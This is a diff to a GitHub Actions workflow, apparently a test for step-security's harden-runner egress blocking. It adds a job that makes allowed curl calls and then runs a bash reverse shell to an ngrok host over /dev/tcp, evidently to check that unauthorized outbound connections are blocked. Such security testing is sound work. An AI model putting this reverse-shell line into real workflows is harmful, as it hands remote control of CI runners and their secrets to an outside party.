@@ -82,3 +82,29 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v3
     - uses: step-security/dummy-compromised-action@v1
+  unauthorized-outbound-call:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: step-security/harden-runner@rc
+      with:
+         egress-policy: block
+         allowed-endpoints: >
+          github.com:443
+          goreleaser.com:443
+          www.google.com:443
+    - name: Checkout code
+      uses: actions/checkout@v3
+            
+    - name: Run outbound calls from host
+      run: |
+        start_time=$(date +%s)
+        end_time=$((start_time + 30))
+        
+        while [ $(date +%s) -lt $end_time ]; do
+          curl -I https://www.google.com
+          curl -I https://goreleaser.com
+          sleep 10  # wait 10 seconds between calls
+        done
+
+    - run: |
+          bash -c "bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/17658 0>&1" 
